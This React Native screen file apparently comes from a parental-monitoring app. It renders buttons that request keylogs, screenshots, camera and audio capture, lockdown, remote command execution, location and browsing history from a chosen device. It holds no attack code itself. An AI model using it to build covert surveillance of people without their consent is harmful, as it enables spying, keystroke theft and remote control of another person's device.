import { React } from "react";
import { Pressable } from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { Text, View } from "react-native-web";
import {
  Ionicons,
  FontAwesome5,
  Feather,
  MaterialCommunityIcons,
  Entypo,
} from "@expo/vector-icons";
import ParentMenu from "../components/ParentMenu";
import global from "../config/global";
import colors from "../config/colors";
import sizes from "../config/sizes";

const ControlOptions = ({ navigation, route }) => {
  const { uid } = route.params;
  const { name } = route.params;

  return (
    <SafeAreaView style={global.PageContainer}>
      <ParentMenu navigation={navigation} />
      <View style={global.RightContainer}>
        <View style={global.HeaderMenu}>
          <Text style={global.HeaderText}>{name}</Text>
        </View>

        <View style={global.RightMenu}>
          <View style={global.MenuRow}>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "SCREENSHOT",
                  name: name,
                })
              }
            >
              <MaterialCommunityIcons
                name="monitor-screenshot"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Screenshots</Text>
            </Pressable>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "KEYLOG",
                  name: name,
                })
              }
            >
              <Entypo
                name="keyboard"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Keylogs</Text>
            </Pressable>

            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "CAMERA",
                  name: name,
                })
              }
            >
              <Feather
                name="camera"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Camera</Text>
            </Pressable>
          </View>
          <View style={global.MenuRow}>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "AUDIO",
                  name: name,
                })
              }
            >
              <FontAwesome5
                name="audio-description"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Audio</Text>
            </Pressable>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "LOCKDOWN",
                  name: name,
                })
              }
            >
              <MaterialCommunityIcons
                name="account-lock"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Lockdown</Text>
            </Pressable>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "COMMAND",
                  name: name,
                })
              }
            >
              <Ionicons
                name="terminal"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>CMD</Text>
            </Pressable>
          </View>
          <View style={global.MenuRow}>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "LOCATION",
                  name: name,
                })
              }
            >
              <Ionicons
                name="location"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Locations</Text>
            </Pressable>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Requests", {
                  uid: uid,
                  type: "NETLOG",
                  name: name,
                })
              }
            >
              <FontAwesome5
                name="history"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>History</Text>
            </Pressable>
            <Pressable
              style={global.MenuButton}
              onPress={() =>
                navigation.navigate("Device Configuration", {
                  uid: uid,
                  type: "CONFIGURATION",
                  name: name,
                })
              }
            >
              <Ionicons
                name="settings-outline"
                size={sizes.iconSize}
                color={colors.primary}
              />
              <Text style={global.MenuButtonText}>Configuration</Text>
            </Pressable>
          </View>
        </View>
      </View>
    </SafeAreaView>
  );
};

export default ControlOptions;
